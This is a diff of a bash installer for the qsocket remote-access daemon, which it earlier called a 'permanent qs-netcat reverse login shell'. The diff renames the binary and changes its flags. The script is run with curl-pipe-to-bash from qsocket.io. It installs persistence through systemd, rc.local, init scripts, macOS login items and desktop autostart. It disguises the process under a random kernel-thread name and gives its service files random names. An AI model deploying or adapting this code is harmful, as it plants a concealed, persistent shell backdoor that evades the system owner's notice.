@@ -1,18 +1,16 @@
 #!/usr/bin/env bash
 
-# Install and start a permanent qs-netcat reverse login shell
-#
-# See https://qsocket.io/deploy/ for examples.
+# Install and start a permanent qsocket daemon.
 #
 # This script is typically invoked like this as root or non-root user:
-#   $ bash -c "$(curl -fsSL qsocket.io/x)"
-#   $ bash -c "$(wget -q -O- qsocket.io/0)"
+#   $ bash -c "$(curl -fsSL qsocket.io)"
+#   $ bash -c "$(wget -q -O- qsocket.io)"
 #
 # Pre-set a secret:
-#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io/0)"
+#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io)"
 #
 # Close terminal window when done
-# $ $HIDE=1 bash -c "$(curl -fsSL qsocket.io/0)"
+# $ $HIDE=1 bash -c "$(curl -fsSL qsocket.io)"
 #
 # Steps taken:
 # 1. Init defauls, get user supplied parameters.
@@ -232,7 +230,7 @@ detect_os() {
 
 get_latest_release_url() {
 	[[ -z "$BIN_NAME" ]] && print_fatal "Binary name not set! Exiting..."
-	local API_URL="$BASE_URL/$BIN_NAME/releases/latest"
+	local API_URL="$BASE_URL/qsocket/releases/latest"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
 	[[ -n $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
@@ -348,7 +346,7 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"SHELL=${SHELL} TERM=xterm-256color QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
+ExecStart=/bin/bash -c \"SHELL=${SHELL} TERM=xterm-256color QS_ARGS='-lq $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
  
 [Install]
 WantedBy=multi-user.target" > "${SERVICE_FILE}"
@@ -363,14 +361,14 @@ install_system_rclocal(){
 	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>"$ERR_LOG"; then
 		print_error "Already installed in ${RCLOCAL_FILE}." && return 0
 	fi
-	RCLOCAL_LINE="set +m; HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"cd $HOME; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
+	RCLOCAL_LINE="set +m; HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-lq $S\" $(command -v bash) -c \"cd $HOME; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null & disown"
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
 	# Thus we need to start /bin/bash -c in a sub-shell before 'exec qs-netcat'.
 	inject_to_file "${RCLOCAL_FILE}" "$RCLOCAL_LINE"
 }
 
 exec_hidden() {
-	set +m; TERM="xterm-256color" QS_ARGS="-liqs $S" exec -a "${PROC_HIDDEN_NAME}" ${QS_PATH} &
+	set +m; TERM="xterm-256color" QS_ARGS="-lq $S" exec -a "${PROC_HIDDEN_NAME}" ${QS_PATH} &
 	disown -a &> "$ERR_LOG"
 }
 
@@ -387,7 +385,7 @@ setup_macos_login_item() {
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}</string>
+        <string>QS_ARGS='-lq $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
@@ -405,7 +403,7 @@ install_desktop_autostart() {
   local desktop_entry="
 [Desktop Entry]
 Name=$RAND_NAME
-Exec=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
+Exec=/bin/bash -c \"QS_ARGS='-lq $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\"
 Terminal=false
 Type=Application
 StartupNotify=false
@@ -426,7 +424,7 @@ install_init_scripts() {
 	)
 
 	local success=""
-	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
+	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-lq $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null & disown"
 	for target in "${inject_targets[@]}"; do
 		grep -q QS_ARGS "$target" &>"$ERR_LOG" && print_status "!! WARNING !! QSocket access already installed via $(basename "$target")" && continue 
 		[[ ! -f $target ]] && continue
@@ -519,9 +517,9 @@ print_usage() {
   echo -n "$S" | $QS_PATH --qr
 	echo -e -n "\n"
 	echo -ne "${BLUE}# >>> Connect ============> ${RESET}" 
-	echo "qs-netcat -i -s $S"	
+	echo "qsock ssh $S"	
 	echo -ne "${BLUE}# >>> Connect With TOR ===> ${RESET}"
-	echo "qs-netcat -T -i -s $S"	
+	echo "qsock -T ssh $S"	
 	# echo -n ${BLUE} "# >>> Uninstall ==========> "
 	# echo "QS_UNDO=1 bash -c \"\$(curl -fsSL qsocket.io/x)\""
 	echo -e "\n"
@@ -541,11 +539,11 @@ init_problematic_vars
 OS_ARCH=$(detect_arch)
 OS_NAME=$(detect_os)
 BASE_URL="https://api.github.com/repos/qsocket"
-GITHUB_RELEASE_URL="https://github.com/qsocket/qs-netcat/releases/download"
-FALLBACK_RELEASE="v0.0.2-beta"
+GITHUB_RELEASE_URL="https://github.com/qsocket/qsocket/releases/download"
+FALLBACK_RELEASE="v0.1.0"
 QS_DIR=$(create_qs_dir)
 RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
-BIN_NAME="qs-netcat"
+BIN_NAME="qsock"
 PROC_HIDDEN_NAME="$(get_random_kernel_proc "$OS_NAME")"
 SERVICE_FILE="/etc/systemd/system/$RAND_NAME.service"
 RCLOCAL_FILE="/etc/rc.local"
